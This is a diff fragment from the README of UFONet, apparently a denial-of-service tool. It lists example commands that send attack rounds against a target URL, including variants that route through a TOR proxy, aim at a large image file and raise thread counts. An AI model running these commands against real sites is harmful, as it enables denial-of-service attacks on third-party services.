@@ -154,7 +154,7 @@ this will do the attack more effective.
      + with verbose:     ./ufonet -a http://target.com -r 10 -v
      + with proxy TOR:   ./ufonet -a http://target.com -r 10 --proxy="http://127.0.0.1:8118"
      + with a place:     ./ufonet -a http://target.com -r 10 -b "/images/big_size_image.jpg"
-     + with threads:     ./ufonet -t zombies.txt --threads 50
+     + with threads:     ./ufonet -a http://target.com -r 10 --threads 50
 
 ###############################
 # Updating
